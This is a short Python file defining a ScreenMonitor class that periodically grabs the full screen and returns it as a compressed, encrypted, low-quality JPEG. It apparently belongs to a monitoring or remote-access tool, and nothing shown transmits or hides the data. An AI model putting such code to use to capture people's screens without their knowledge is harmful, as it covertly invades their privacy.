from PIL import ImageGrab
import zlib
import io
import time
from utils.encryption import DataEncryptor

class ScreenMonitor:
    def __init__(self, interval=300, quality=30):
        self.interval = interval  # 5 minutes default
        self.quality = quality
        self.last_capture = 0
        self.encryptor = DataEncryptor()
        
    def capture_screen(self):
        if time.time() - self.last_capture < self.interval:
            return None
            
        try:
            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, "JPEG", quality=self.quality)
            compressed = zlib.compress(buffer.getvalue())
            encrypted = self.encryptor.encrypt(compressed)
            self.last_capture = time.time()
            return encrypted
        except Exception as e:
            print(f"[SCREENSHOT ERROR] {str(e)}")
            return None
